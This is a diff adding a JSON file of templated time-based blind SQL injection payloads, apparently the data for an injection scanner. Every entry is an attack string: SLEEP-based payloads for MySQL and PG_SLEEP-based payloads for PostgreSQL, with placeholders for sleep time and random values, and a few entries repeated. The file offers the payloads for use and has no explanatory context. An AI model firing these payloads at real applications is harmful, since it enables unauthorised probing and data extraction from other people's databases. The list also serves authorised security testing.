@@ -1,0 +1,30 @@
+[
+    {
+        "database": "MySQL",
+        "payload": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])"
+    },
+    {
+        "database": "MySQL",
+        "payload": "AND SLEEP([SLEEPTIME])"
+    },
+    {
+        "database": "MySQL",
+        "payload": "OR SLEEP([SLEEPTIME])"
+    },
+    {
+        "database": "MySQL",
+        "payload": "AND SLEEP([SLEEPTIME])"
+    },
+    {
+        "database": "PostgreSQL",
+        "payload": "AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))"
+    },
+    {
+        "database": "PostgreSQL",
+        "payload": "OR [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))"
+    },
+    {
+        "database": "PostgreSQL",
+        "payload": "AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))"
+    }
+]
